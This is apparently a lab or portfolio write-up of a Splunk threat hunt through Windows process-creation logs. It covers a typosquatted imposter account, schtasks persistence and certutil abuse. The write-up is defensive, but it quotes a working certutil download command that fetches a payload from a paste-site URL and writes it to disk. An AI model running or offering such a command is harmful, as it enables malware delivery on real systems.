<img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/0bb6f367-f21b-4b54-a987-6b87f03f92c5" /><h1>Insider Threat & LOLBin Analysis: Incident Response Investigation via Splunk</h1>

<br>
<h2>Executive Summary</h2>
<p>During a routine security assessment, a client's <b>Intrusion Detection System (IDS)</b> flagged anomalous network activity originating from the <b>Human Resources (HR)</b> logical segment. Initial alerts suggested local host compromise, indicated by the unauthorized execution of network discovery utilities and persistence mechanisms. Due to aggressive log rotation and resource constraints, forensics was restricted to host-centric <b>Windows Event Logs (Event ID 4688: Process Creation)</b>.</p>
<p>These logs were centralized and ingested into a <b>SIEM (Splunk)</b> platform for historical analysis. A thorough timeline reconstruction uncovered an insider threat vector via an imposter account, along with an external exploitation chain involving <b>Living-off-the-Land Binaries (LOLBins)</b> to download an unauthorized second-stage payload. The affected assets were successfully identified for isolation and remediation.</p>

<br>
<h2>Objective</h2>
<p>The primary objective of this investigation was to conduct a comprehensive threat-hunting exercise within the <b>win_eventlogs</b> index to fully scope the extent of the HR department compromise. This involved isolating anomalous process creation events, identifying the specific threat actors or compromised accounts, mapping the adversarial techniques to the <b>MITRE ATT&CK</b> framework, and extracting actionable <b>Indicators of Compromise (IoCs)</b> to prevent future exploitation across the corporate network.</p>

<br>
<h2>Scenario</h2>
<p>An enterprise network, logically segmented into IT, HR, and Marketing departments, experienced a targeted security incident. The threat hunter was tasked with analyzing a 30-day window of <b>Windows Event ID 4688</b> logs in <b> Splunk</b>. The environment consisted of known, legitimate corporate identities across three business units:</p>
<ul>
  <li><b>IT Department:</b> James, Moin, Katrina</li>
  <br><li><b>HR Department: </b>Haroon, Chris, Diana</li>
  <br><li><b>Marketing Department:</b> Bell, Amelia, Deepak</li>
</ul>
<p>The investigation focused on determining how security controls were bypassed, identifying which valid users were compromised, and tracking the post-exploitation commands executed by the threat actor.</p>

<br>
<h2>Skills Learned</h2>
<ul>
  <li><b>SIEM Log Parsing:</b> Querying, filtering, and structuring unstructured Windows Event Logs within Splunk.</li>
  <br><li><b>Threat Hunting Methodology:</b> Utilizing statistical anomalies (Rare Values) to identify malicious activity buried in high-volume baseline logs.</li>
  <br><li><b>Identity & Access Auditing:</b> Detecting defense evasion techniques, such as typosquatting and account impersonation.</li>
  <br><li><b>LOLBin Analysis:</b> Identifying and deconstructing the abuse of legitimate operating system binaries for malicious purposes.</li>
</ul>

<br>
<h2>Tool Utilized</h2>
<ul>
  <li><b>Splunk Enterprise:</b> Centralized log analysis, statistical aggregation, and event correlation.</li>
</ul>

<br>
<h2>Artifacts</h2>
<ul>
  <li><b>Windows Security Event Logs:</b> Event ID 4688 (Process Creation).</li>
  <li><b>Command Line Arguments:</b> Extracted strings from the <b>CommandLine</b> field detailing attacker execution.</li>
</ul>

<br>
<h2>Findings</h2>
<h3>Phase 1: Ingestion and Baseline Analysis</h3>
<p>The investigation initiated with the ingestion of the <b>win_eventlogs</b> index to establish a baseline of process creation events.</p>

    index=win_eventlogs

<p>Because the incident was reported to have occurred within <b>March 2022</b>, the time picker was restricted to a static range from <b>March 1, 2022</b>, to <b>March 31, 2022</b>. This initial query returned a total volume of <b>13,959 events</b>, creating the baseline dataset for deeper analysis.</p>

<p><img width="802" height="539" alt="image" src="https://github.com/user-attachments/assets/53aa4b68-bec5-4b72-9c47-34128b5ef062" />
</p>
<p><img width="807" height="677" alt="image" src="https://github.com/user-attachments/assets/8a817dea-d7e7-4044-881d-fe2ebf078aa9" />
</p>
<p><img width="726" height="495" alt="image" src="https://github.com/user-attachments/assets/f3a668ca-0a06-4cc1-a7bf-0b079caa31ea" />
</p>
<p><img width="696" height="446" alt="image" src="https://github.com/user-attachments/assets/d0b849bd-310a-4f78-8a47-50a83d305fac" />
</p>

<br>
<h3>Phase 2: Identity Analysis & Imposter Detection</h3>
<p>An audit of the <b>UserName</b> field in the left-hand metadata pane revealed an anomaly: <b>Splunk</b> registered <b>11</b> distinct usernames, whereas corporate documentation only accounted for <b>10</b> legitimate users across the three departments. To expose the hidden identity, a statistical aggregation query was executed:</p>

    index=win_eventlogs
    | top limit=11 UserName
    
<p>The results revealed a high-fidelity indicator of defense evasion via an imposter account: <b>Amel1a</b>. The threat actor used typosquatting (substituting the lowercase letter <b>"i"</b> with the number <b>"1"</b>) to establish a deceptive identity that closely mimicked a legitimate Marketing employee, <b>Amelia</b>.</p>
<p><img width="959" height="556" alt="image" src="https://github.com/user-attachments/assets/96c77bae-7252-4340-9e92-7b2d4771a82d" />
</p>
<p><img width="865" height="890" alt="image" src="https://github.com/user-attachments/assets/e566cc9b-93b2-4e06-9c21-07740230ab60" />
</p>

<br>
<h3>Phase 3: Persistence and Reconnaissance Profiling</h3>
<p>Attention shifted to the HR department to investigate the alerts regarding scheduled tasks and network discovery. By filtering the logs for task scheduling utilities, a specific corporate account was flagged:</p>
   
    index=win_eventlogs schtasks

<p>The analysis confirmed that the user <b>Chris.fort</b> from the HR department was actively executing <b>schtasks.exe</b>. This behavior confirmed the threat actor's efforts to establish persistence on the host machine.</p>
<p><img width="699" height="626" alt="image" src="https://github.com/user-attachments/assets/8be19bef-f554-45f9-a2d9-1b059411f000" />
</p>

<br>
<h3>Phase 4: LOLBin Exploitation and Payload Retrieval</h3>
<p>To identify how the external payload entered the environment, the scope was focused entirely on HR hosts. A query was constructed to analyze the <b>CommandLine</b> field using statistical rare-value filtering, isolating unique command strings that deviated from standard business operations.</p>
<p><img width="808" height="722" alt="image" src="https://github.com/user-attachments/assets/158d00d5-99f7-4ed4-8416-bc94caa2ba74" />
</p>
<p><img width="975" height="449" alt="image" src="https://github.com/user-attachments/assets/49a8d208-fe56-4af1-a3b0-fb89208d1432" />
</p>
<p><img width="877" height="452" alt="image" src="https://github.com/user-attachments/assets/c92f900f-30b5-4ff3-a85a-4263ff53c8ba" />
</p>
<p><img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/59df53aa-b24e-4fe0-af6a-57e166e09d1f" />
</p>
<p><img width="745" height="534" alt="image" src="https://github.com/user-attachments/assets/45fd6ee9-a823-41c7-8e4a-9c787873e322" />
</p>
<p>This analysis targeted the user <b>haroon</b>. The data revealed that the threat actor abused a native <b> Windows Living-off-the-Land Binary (LOLBin)</b> — <b>certutil.exe</b> — to bypass traditional application whitelisting and network perimeters.</p>
<p>On <b>March 4, 2022</b>, the compromised host executed the following command to reach out to the internet, retrieve a payload from a text-hosting platform, and write it to disk:</p>

    certutil.exe -urlcache -f https://controlc.com/e4d11035 benign.exe

<p><img width="902" height="490" alt="image" src="https://github.com/user-attachments/assets/d9143261-72bd-4976-9a77-ab28af2066c7" />
</p>
<ul>
  <li><b>Abused Binary:</b> <i>certutil.exe</i> (utilizing the <i>-urlcache</i> flag to download remote files).</li>
  <li><b>Command and Control (C2) Infrastructure:</b> <i>[https://controlc.com/e4d11035](https://controlc.com/e4d11035)</i></li>
  <p><img width="902" height="490" alt="image" src="https://github.com/user-attachments/assets/a33fb1e7-e328-4f19-b535-9a223921348f" />
</p>
  <li><b>Dropped Payload:</b> <i>benign.exe</i> (staged locally during the post-exploitation phase).</li>
  <li>Investigated the third-party site, <b>https://controlc.com/e4d11035</b> (which is the URL that the infected host connected to), and analyzed the pattern of the suspicious file downloaded from the C2 server malicious content.</li>
  <p><img width="842" height="502" alt="image" src="https://github.com/user-attachments/assets/b1b7ca57-dd0b-4708-9e5a-3f744c105745" />
</p>
</ul>











